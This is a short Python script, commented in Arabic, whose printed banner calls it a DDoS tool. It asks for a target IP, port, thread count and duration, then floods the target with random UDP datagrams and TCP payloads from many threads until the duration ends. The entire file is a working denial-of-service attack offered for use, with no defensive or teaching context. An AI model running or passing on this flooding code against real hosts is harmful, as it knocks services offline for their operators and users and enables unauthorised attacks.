# Team
import random
import socket
import threading
import platform
import time

# معلومات البداية
print("DDoS Script Running on:", platform.system())

# معلومات الدخول
ip = input("Target IP: ")
port = int(input("Target Port: "))
times = int(input("Packets per thread: "))
threads = int(input("Number of threads: "))
duration = int(input("Attack duration (seconds): "))  # مدة الهجوم
end_time = time.time() + duration

# دالة هجوم UDP
def udp_attack():
    data = random._urandom(4096)  # حجم أكبر للبيانات
    i = random.choice(["[UDP] ➤", "[UDP] ➜", "[UDP] ➲"])
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr)
            print(i, "Packets sent to", ip)
        except:
            print("[UDP] Server might be down!")

# دالة هجوم TCP
def tcp_attack():
    data = random._urandom(2048)
    i = random.choice(["[TCP] ➤", "[TCP] ➜", "[TCP] ➲"])
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i, "Data sent to", ip)
            s.close()
        except:
            print("[TCP] Connection failed or target down!")

# إطلاق الثريدات لكلا الهجومين
for y in range(threads):
    threading.Thread(target=udp_attack).start()
    threading.Thread(target=tcp_attack).start()
